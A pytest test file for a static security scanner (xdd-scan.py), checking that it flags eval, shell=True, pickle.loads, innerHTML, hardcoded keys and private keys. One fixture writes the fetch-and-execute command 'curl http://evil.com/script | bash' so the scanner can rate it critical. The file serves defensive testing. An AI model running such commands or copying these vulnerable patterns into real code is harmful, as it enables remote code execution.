"""Tests para scripts/xdd-scan.py — SAST nativo X-DD."""
from __future__ import annotations
import importlib.util, json, sys, tempfile
from pathlib import Path
import pytest

ROOT = Path(__file__).resolve().parent.parent
SCRIPTS = ROOT / "scripts"
sys.path.insert(0, str(SCRIPTS))

spec_ = importlib.util.spec_from_file_location("xdd_scan", SCRIPTS / "xdd-scan.py")
xs = importlib.util.module_from_spec(spec_)
spec_.loader.exec_module(xs)


@pytest.fixture
def tmp(tmp_path):
    return tmp_path


def _args(**kw):
    ns = type("A", (), {})()
    ns.output = None
    for k, v in kw.items():
        setattr(ns, k, v)
    return ns


# ── source scan ───────────────────────────────────────────────────────────────

def test_detects_eval(tmp):
    (tmp / "bad.py").write_text("x = eval(user_input)\n")
    findings = xs._scan_file_with_patterns(tmp / "bad.py", xs.PYTHON_PATTERNS, "python")
    assert any("eval" in f["description"].lower() for f in findings)


def test_detects_shell_true(tmp):
    (tmp / "bad.py").write_text("subprocess.run(cmd, shell=True)\n")
    findings = xs._scan_file_with_patterns(tmp / "bad.py", xs.PYTHON_PATTERNS, "python")
    assert any("shell=True" in f["description"] for f in findings)


def test_detects_pickle(tmp):
    (tmp / "bad.py").write_text("data = pickle.loads(raw)\n")
    findings = xs._scan_file_with_patterns(tmp / "bad.py", xs.PYTHON_PATTERNS, "python")
    assert any("Pickle" in f["description"] for f in findings)


def test_detects_js_innerhtml(tmp):
    (tmp / "bad.js").write_text("el.innerHTML = userInput;\n")
    findings = xs._scan_file_with_patterns(tmp / "bad.js", xs.JS_PATTERNS, "js")
    assert any("innerHTML" in f["description"] for f in findings)


def test_detects_bash_curl_pipe(tmp):
    (tmp / "bad.sh").write_text("curl http://evil.com/script | bash\n")
    findings = xs._scan_file_with_patterns(tmp / "bad.sh", xs.BASH_PATTERNS, "bash")
    assert any("CRITICAL" == f["severity"] for f in findings)


def test_no_false_positive_safe_code(tmp):
    (tmp / "safe.py").write_text("x = ast.literal_eval(user_input)\n")
    findings = xs._scan_file_with_patterns(tmp / "safe.py", xs.PYTHON_PATTERNS, "python")
    # literal_eval no debe disparar
    assert not any("eval" in f["description"].lower() and f["severity"] == "HIGH" for f in findings)


def test_cmd_source_output_json(tmp, capsys):
    (tmp / "test.py").write_text("result = eval(x)\npickle.loads(data)\n")
    rc = xs.cmd_source(_args(directory=str(tmp), lang="auto", output=None))
    out = capsys.readouterr().out
    data = json.loads(out)
    assert "findings" in data
    assert data["total"] >= 1
    assert rc in (0, 1, 2)


def test_output_json_schema(tmp):
    (tmp / "f.py").write_text("eval(x)\n")
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
        out_path = f.name
    xs.cmd_source(_args(directory=str(tmp), lang="auto", output=out_path))
    data = json.loads(Path(out_path).read_text())
    assert "scan_type" in data
    assert "timestamp" in data
    assert "total" in data
    assert "by_severity" in data
    assert "findings" in data
    for finding in data["findings"]:
        assert "id" in finding
        assert "severity" in finding
        assert finding["severity"] in xs.SEVERITY


# ── secrets scan ──────────────────────────────────────────────────────────────

def test_detects_hardcoded_api_key(tmp):
    (tmp / "config.py").write_text('API_KEY = "sk-abcdef1234567890abcdef1234567890"\n')
    findings = []
    for pat, sev, type_, desc in xs.SECRET_PATTERNS:
        import re
        text = (tmp / "config.py").read_text()
        for i, line in enumerate(text.splitlines(), 1):
            if re.search(pat, line):
                findings.append({"severity": sev, "description": desc})
    assert any("secret" in f["description"].lower() or "key" in f["description"].lower() for f in findings)


def test_detects_private_key(tmp):
    (tmp / "key.pem").write_text("-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n")
    rc = xs.cmd_secrets(_args(directory=str(tmp), output=None))
    # exit 2 because CRITICAL
    assert rc == 2


# ── lang detection ────────────────────────────────────────────────────────────

def test_lang_detection():
    assert xs._detect_lang(Path("foo.py")) == "python"
    assert xs._detect_lang(Path("foo.ts")) == "js"
    assert xs._detect_lang(Path("foo.sh")) == "bash"
    assert xs._detect_lang(Path("foo.go")) == "unknown"


# ── cvss estimate ─────────────────────────────────────────────────────────────

def test_cvss_critical():
    assert xs._cvss_estimate("CRITICAL") == "9.0-10.0"

def test_cvss_info():
    assert xs._cvss_estimate("INFO") == "0.0"
